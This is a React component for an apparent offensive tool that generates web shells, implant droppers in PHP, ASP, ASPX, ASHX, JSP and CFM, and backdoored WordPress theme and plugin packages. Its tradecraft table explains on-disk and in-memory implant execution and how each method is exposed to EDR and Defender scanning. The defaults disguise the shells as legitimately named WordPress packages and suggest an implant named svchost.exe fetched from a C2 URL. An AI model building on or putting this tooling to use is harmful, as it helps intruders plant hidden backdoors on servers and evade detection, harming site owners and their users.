import { useState } from 'react'
import { api } from '../lib/api'
import { copyText } from '../lib/clipboard'
import { Redacted } from '../components/Redacted'

function b64Decode(s: string) { try { return atob(s) } catch { return s } }

type Format = 'php' | 'asp' | 'aspx' | 'ashx' | 'jsp' | 'cfm' | 'theme' | 'plugin'
type Mode = 'webshell' | 'dropper' | 'wordpress'
type ExecMethod = 'disk' | 'memory'

const tradecraft: Record<string, Record<Format, string>> = {
  disk: {
    php: 'Downloads implant to /tmp/{binaryName} and executes via popen(). CAUTION: Binary is written to disk and visible to file-based EDR scanning. The file persists after execution \u2014 consider cleanup.',
    asp: 'Downloads implant via MSXML2.ServerXMLHTTP and saves to disk. CAUTION: Triggers Windows Defender real-time scanning on file write. Binary is visible in the file system and process list.',
    aspx: 'Downloads implant via WebClient and executes via Process.Start(). CAUTION: .NET download + process creation generates ETW events. Binary persists on disk.',
    ashx: 'Downloads implant via WebClient and executes via Process.Start() from a generic IHttpHandler. CAUTION: Same ETW/on-disk footprint as ASPX; choose ASHX when the target exposes .ashx endpoints without the full Page pipeline.',
    jsp: 'Downloads implant via java.net.URL and writes to temp directory. CAUTION: Java process spawning a native binary is anomalous and may trigger EDR behavioral rules. Requires write access to temp directory.',
    cfm: 'Downloads implant via <cfhttp> and executes via <cfexecute>. CAUTION: ColdFusion process spawning external binaries is high-signal. Binary persists on disk.',
    theme: 'Packages the PHP web shell inside a custom WordPress theme ZIP archive.',
    plugin: 'Packages the PHP web shell inside a custom WordPress plugin ZIP archive.',
  },
  memory: {
    php: 'Executes implant in memory using proc_open() with stdin pipe. Requires PHP proc_open() to be enabled (often disabled in hardened configs). On Linux, uses /dev/stdin fd passing. No file written to disk.',
    asp: 'Pipes implant bytes to a shell process via ADODB.Stream + WScript.Shell.Exec stdin. CAUTION: Classic ASP has limited in-memory execution capabilities \u2014 this uses stdin piping which may not work for all implant types.',
    aspx: 'Loads implant using Assembly.Load(byte[]) for .NET payloads or VirtualAlloc/CreateThread via P/Invoke for native PE. Requires the implant to be a .NET assembly or shellcode. No file touches disk.',
    ashx: 'Loads implant using Assembly.Load(byte[]) inside an IHttpHandler. Requires a .NET assembly payload. No file touches disk. Identical tradecraft to ASPX in-memory; use when the target routes to .ashx.',
    jsp: 'Loads implant using ClassLoader.defineClass() from byte array. Requires the implant to be a Java class or JAR. For native binaries, falls back to stdin piping via ProcessBuilder. No file written to disk.',
    cfm: 'Uses Java\'s ClassLoader (ColdFusion runs on JVM) for Java payloads. CAUTION: Native PE in-memory execution is limited on ColdFusion \u2014 falls back to temp file with immediate deletion as best-effort.',
    theme: 'Packages the PHP web shell inside a custom WordPress theme ZIP archive.',
    plugin: 'Packages the PHP web shell inside a custom WordPress plugin ZIP archive.',
  },
}

export default function Generator() {
  const [mode, setMode] = useState<Mode>('webshell')
  const [format, setFormat] = useState<Format>('php')
  const [implantUrl, setImplantUrl] = useState('')
  const [binaryName, setBinaryName] = useState('')
  const [execMethod, setExecMethod] = useState<ExecMethod>('disk')
  const [harpyToken, setHarpyToken] = useState('')
  const [payloadFileName, setPayloadFileName] = useState('cache.php')
  const [packageArchiveName, setPackageArchiveName] = useState('envo-royal.1.0.14.zip')
  const [payloadDirectory, setPayloadDirectory] = useState('extra')
  const [archiveRootDir, setArchiveRootDir] = useState('envo-royal')

  const [result, setResult] = useState<{ fileName: string; authKey: string; content: string } | null>(null)
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState('')

  async function generate() {
    setLoading(true)
    setError('')
    try {
      let res
      if (mode === 'dropper') {
        res = await api.generate(format, 'dropper', implantUrl, binaryName, execMethod === 'memory', undefined, undefined, undefined, undefined, harpyToken)
      } else if (mode === 'wordpress') {
        res = await api.generate(format, 'wordpress', undefined, undefined, undefined, payloadFileName, packageArchiveName, payloadDirectory, archiveRootDir)
      } else {
        res = await api.generate(format)
      }
      setResult(res)
    } catch (e) {
      setError(String(e))
    } finally {
      setLoading(false)
    }
  }

  function download() {
    if (!result) return
    const raw = b64Decode(result.content)
    let blob: Blob
    if (result.fileName.endsWith('.zip')) {
      const arr = new Uint8Array(raw.length)
      for (let i = 0; i < raw.length; i++) {
        arr[i] = raw.charCodeAt(i)
      }
      blob = new Blob([arr], { type: 'application/zip' })
    } else {
      blob = new Blob([raw], { type: 'text/plain' })
    }
    const url = URL.createObjectURL(blob)
    const a = document.createElement('a')
    a.href = url
    a.download = result.fileName
    a.click()
    URL.revokeObjectURL(url)
  }

  const canGenerate = mode === 'webshell' || mode === 'wordpress' || (
    implantUrl.trim() !== '' && (execMethod === 'memory' || binaryName.trim() !== '')
  )

  return (
    <div className="p-4 max-w-2xl">
      <h2 className="text-sm font-semibold uppercase tracking-wide mb-4">
        {mode === 'dropper' ? 'Generate Dropper' : mode === 'wordpress' ? 'Generate WordPress Package' : 'Generate Web Shell'}
      </h2>

      {/* Mode toggle */}
      <div className="flex gap-1 mb-4 bg-surface-input rounded-sm p-0.5 w-fit">
        {(['webshell', 'dropper', 'wordpress'] as const).map((m) => (
          <button
            key={m}
            onClick={() => {
              setMode(m);
              if (m === 'wordpress') {
                setFormat('theme')
                setPayloadFileName('cache.php')
                setPackageArchiveName('envo-royal.1.0.14.zip')
                setPayloadDirectory('extra')
                setArchiveRootDir('envo-royal')
              } else {
                setFormat('php')
              }
              setResult(null);
              setError('')
            }}
            className={`px-3 py-1 rounded-sm text-xs font-semibold ${mode === m ? 'bg-accent text-content-primary' : 'text-content-secondary hover:text-content-primary'
              }`}
          >
            {m === 'webshell' ? 'Web Shell' : m === 'dropper' ? 'Dropper' : 'WordPress'}
          </button>
        ))}
      </div>

      {/* Format buttons + generate */}
      <div className="flex flex-wrap gap-2 lg:gap-3 mb-4">
        {mode !== 'wordpress' ? (
          (['php', 'asp', 'aspx', 'ashx', 'jsp', 'cfm'] as const).map((f) => (
            <button
              key={f}
              onClick={() => setFormat(f)}
              className={`px-3 py-1 rounded-sm text-xs font-semibold uppercase ${format === f ? 'bg-accent text-content-primary' : 'bg-surface-input text-content-secondary hover:bg-surface-hover'
                }`}
            >
              {f}
            </button>
          ))
        ) : (
          (['theme', 'plugin'] as const).map((f) => (
            <button
              key={f}
              onClick={() => {
                setFormat(f)
                if (f === 'theme') {
                  setPayloadFileName('widget.php')
                  setPackageArchiveName('envo-royal.1.0.14.zip')
                  setPayloadDirectory('extra')
                  setArchiveRootDir('envo-royal')
                } else {
                  setPayloadFileName('cache.php')
                  setPackageArchiveName('wp-ajaxify-comments.3.2.2.zip')
                  setPayloadDirectory('lib/composer')
                  setArchiveRootDir('wp-ajaxify-comments')
                }
              }}
              className={`px-3 py-1 rounded-sm text-xs font-semibold uppercase ${format === f ? 'bg-accent text-content-primary' : 'bg-surface-input text-content-secondary hover:bg-surface-hover'
                }`}
            >
              {f === 'theme' ? 'Theme' : 'Plugin'}
            </button>
          ))
        )}
        <button
          onClick={generate}
          disabled={loading || !canGenerate}
          className="ml-auto px-4 py-1.5 rounded-sm bg-accent-tertiary hover:bg-accent-tertiary-hover text-black text-xs font-semibold disabled:opacity-50"
        >
          {loading ? 'Generating...' : 'Generate'}
        </button>
      </div>

      {/* Dropper-specific inputs */}
      {mode === 'dropper' && (
        <div className="mb-4 space-y-4">
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div>
              <label className="text-xs text-content-muted block mb-1">Implant URL</label>
              <input
                value={implantUrl}
                onChange={(e) => setImplantUrl(e.target.value)}
                placeholder="http://c2.example.com/payload.exe"
                className="w-full bg-surface-input text-xs px-2 py-1.5 rounded-sm border border-border focus:outline-none focus:border-accent"
              />
            </div>
            <div>
              <label className="text-xs text-content-muted block mb-1">Harpy Token (Optional)</label>
              <input
                value={harpyToken}
                onChange={(e) => setHarpyToken(e.target.value)}
                placeholder="SHA-1 Checksum (40 hex chars, optional)"
                className="w-full bg-surface-input text-xs px-2 py-1.5 rounded-sm border border-border focus:outline-none focus:border-accent"
              />
            </div>
          </div>

          {/* Execution method toggle */}
          <div>
            <label className="text-xs text-content-muted block mb-1">Execution Method</label>
            <div className="flex gap-1 bg-surface-input rounded-sm p-0.5 w-fit">
              {(['disk', 'memory'] as const).map((m) => (
                <button
                  key={m}
                  onClick={() => setExecMethod(m)}
                  className={`px-3 py-1 rounded-sm text-xs font-semibold ${execMethod === m ? 'bg-accent-secondary text-black' : 'text-content-secondary hover:text-content-primary'
                    }`}
                >
                  {m === 'disk' ? 'On Disk' : 'In-Memory'}
                </button>
              ))}
            </div>
          </div>

          {/* Binary name (disk only) */}
          {execMethod === 'disk' && (
            <div>
              <label className="text-xs text-content-muted block mb-1">Binary Name</label>
              <input
                value={binaryName}
                onChange={(e) => setBinaryName(e.target.value)}
                placeholder="svchost.exe"
                className="w-full bg-surface-input text-xs px-2 py-1.5 rounded-sm border border-border"
              />
            </div>
          )}

          {/* Tradecraft description */}
          <div className="bg-surface-card rounded p-3 border border-border">
            <p className="text-xs text-content-secondary">
              {tradecraft[execMethod][format]}
            </p>
          </div>
        </div>
      )}

      {mode === 'wordpress' && (
        <div className="mb-4 space-y-4">
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
            <div>
              <label className="text-xs text-content-muted block mb-1">Root Directory</label>
              <input
                value={archiveRootDir}
                onChange={(e) => setArchiveRootDir(e.target.value)}
                placeholder={format === 'theme' ? 'envo-royal' : 'wp-ajaxify-comments'}
                className="w-full bg-surface-input text-xs px-2 py-1.5 rounded-sm border border-border focus:outline-none focus:border-accent"
              />
            </div>
            <div>
              <label className="text-xs text-content-muted block mb-1">Archive Name</label>
              <input
                value={packageArchiveName}
                onChange={(e) => setPackageArchiveName(e.target.value)}
                placeholder={format === 'theme' ? 'envo-royal.1.0.14.zip' : 'wp-ajaxify-comments.3.2.2.zip'}
                className="w-full bg-surface-input text-xs px-2 py-1.5 rounded-sm border border-border focus:outline-none focus:border-accent"
              />
            </div>
            <div>
              <label className="text-xs text-content-muted block mb-1">Payload Directory</label>
              <input
                value={payloadDirectory}
                onChange={(e) => setPayloadDirectory(e.target.value)}
                placeholder="php"
                className="w-full bg-surface-input text-xs px-2 py-1.5 rounded-sm border border-border focus:outline-none focus:border-accent"
              />
            </div>
            <div>
              <label className="text-xs text-content-muted block mb-1">File Name</label>
              <input
                value={payloadFileName}
                onChange={(e) => setPayloadFileName(e.target.value)}
                placeholder="joro.php"
                className="w-full bg-surface-input text-xs px-2 py-1.5 rounded-sm border border-border focus:outline-none focus:border-accent"
              />
            </div>
          </div>
          <div className="bg-surface-card rounded p-3 border border-border">
            <p className="text-xs text-content-secondary">
              {tradecraft['disk'][format]}
            </p>
          </div>
        </div>
      )}

      {error && <div className="text-semantic-error text-sm mb-4">{error}</div>}

      {result && (
        <div className="space-y-4">
          {/* Auth key */}
          <div className="bg-surface-card rounded p-3 border border-border">
            <div className="flex items-center justify-between mb-1">
              <span className="text-xs text-content-muted uppercase">Auth Key</span>
              <button onClick={() => copyText(result.authKey)} className="text-xs text-accent-secondary hover:text-accent-secondary-hover">
                Copy
              </button>
            </div>
            <code className="text-accent-tertiary text-sm break-all"><Redacted value={result.authKey} kind="secret" /></code>
          </div>

          {mode === 'wordpress' ? (
            <>
              {/* Web Shell Path */}
              <div className="bg-surface-card rounded p-3 border border-border">
                <div className="flex items-center justify-between mb-1">
                  <span className="text-xs text-content-muted uppercase">Web Shell Path</span>
                  <button
                    onClick={() => {
                      const root = archiveRootDir.replace(/^\/|\/$/g, '');
                      const dir = payloadDirectory.replace(/^\/|\/$/g, '');
                      const name = payloadFileName.replace(/^\//, '');
                      const path = `/wp-content/${format === 'theme' ? 'themes' : 'plugins'}/${root}/${dir}/${name}`.replace(/\/+/g, '/');
                      copyText(path);
                    }}
                    className="text-xs text-accent-secondary hover:text-accent-secondary-hover"
                  >
                    Copy
                  </button>
                </div>
                <code className="text-accent-secondary text-sm break-all">
                  {(() => {
                    const root = archiveRootDir.replace(/^\/|\/$/g, '');
                    const dir = payloadDirectory.replace(/^\/|\/$/g, '');
                    const name = payloadFileName.replace(/^\//, '');
                    return `/wp-content/${format === 'theme' ? 'themes' : 'plugins'}/${root}/${dir}/${name}`.replace(/\/+/g, '/');
                  })()}
                </code>
              </div>

              {/* WordPress Package */}
              <div className="bg-surface-card rounded p-3 border border-border">
                <div className="flex items-center justify-between mb-1">
                  <span className="text-xs text-content-muted uppercase">WordPress Package</span>
                  <button onClick={download} className="text-xs text-accent-secondary hover:text-accent-secondary-hover">
                    Download Package
                  </button>
                </div>
                <code className="text-accent-secondary text-sm break-all">{result.fileName}</code>
              </div>
            </>
          ) : (
            <>
              {/* File name */}
              <div className="bg-surface-card rounded p-3 border border-border">
                <div className="text-xs text-content-muted uppercase mb-1">File</div>
                <code className="text-accent-secondary text-sm">{result.fileName}</code>
              </div>

              {/* Content / Path preview */}
              <div className="bg-surface-card rounded p-3 border border-border">
                <div className="flex items-center justify-between mb-2">
                  <span className="text-xs text-content-muted uppercase">
                    {!result.fileName.endsWith('.zip') ? 'Content' : 'Path'}
                  </span>
                  <div className="flex gap-2">
                    {!result.fileName.endsWith('.zip') ? (
                      <button onClick={() => copyText(b64Decode(result.content))} className="text-xs text-accent-secondary hover:text-accent-secondary-hover">
                        Copy
                      </button>
                    ) : (
                      <button
                        onClick={() => {
                          const archivePath = `${archiveRootDir ? archiveRootDir.replace(/\/$/, '') + '/' : ''}${payloadDirectory ? payloadDirectory.replace(/\/$/, '') + '/' : ''}${payloadFileName}`;
                          copyText(archivePath);
                        }}
                        className="text-xs text-accent-secondary hover:text-accent-secondary-hover"
                      >
                        Copy Path
                      </button>
                    )}
                    <button onClick={download} className="text-xs text-accent-secondary hover:text-accent-secondary-hover">
                      Download Archive
                    </button>
                  </div>
                </div>
                {!result.fileName.endsWith('.zip') ? (
                  <pre className="text-xs text-content-secondary overflow-auto max-h-64 whitespace-pre-wrap">
                    {b64Decode(result.content)}
                  </pre>
                ) : (
                  <code className="text-accent-secondary text-sm">
                    {`${archiveRootDir ? archiveRootDir.replace(/\/$/, '') + '/' : ''}${payloadDirectory ? payloadDirectory.replace(/\/$/, '') + '/' : ''}${payloadFileName}`}
                  </code>
                )}
              </div>
            </>
          )}
        </div>
      )}
    </div>
  )
}
